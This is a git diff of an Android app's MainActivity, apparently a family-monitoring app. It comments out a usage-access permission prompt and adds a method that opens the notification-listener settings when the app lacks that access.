@@ -14,6 +14,7 @@ import android.app.Activity;
 import android.app.AppOpsManager;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -39,6 +40,7 @@ import com.family.accessibility.MyAccessibilityService;
 import com.family.location.LocationService;
 
 import java.util.List;
+import java.util.Set;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -127,19 +129,40 @@ public class MainActivity extends AppCompatActivity {
 //            }
 //        }
 
-        if(!isUssageS()) {
-            Log.d("salam", "Not garanted");
-//            Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS, Uri.parse("package:" + getPackageName()));
-//            startActivityForResult(intent, 0);
 
-            startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
-        }else {
-            Log.d("salam", "garanted");
-        }
+        //set UssageS
+//        if(!isUssageS()) {
+//            Log.d("salam", "Not garanted");
+////            Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS, Uri.parse("package:" + getPackageName()));
+////            startActivityForResult(intent, 0);
+//
+//            startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
+//        }else {
+//            Log.d("salam", "garanted");
+//        }
+
+        setNotificationAccess();
 
     }
 
 
+
+    public void setNotificationAccess() {
+
+
+
+        String packageName = this.getPackageName();
+        Set<String> enabledPackages = NotificationManagerCompat.getEnabledListenerPackages(this);
+        if(enabledPackages.contains(packageName)) {
+
+        }else {
+            getApplicationContext().startActivity(new Intent(
+                    Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
+        }
+
+
+
+    }
     public boolean isUssageS() {
         AppOpsManager appOps = null;
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
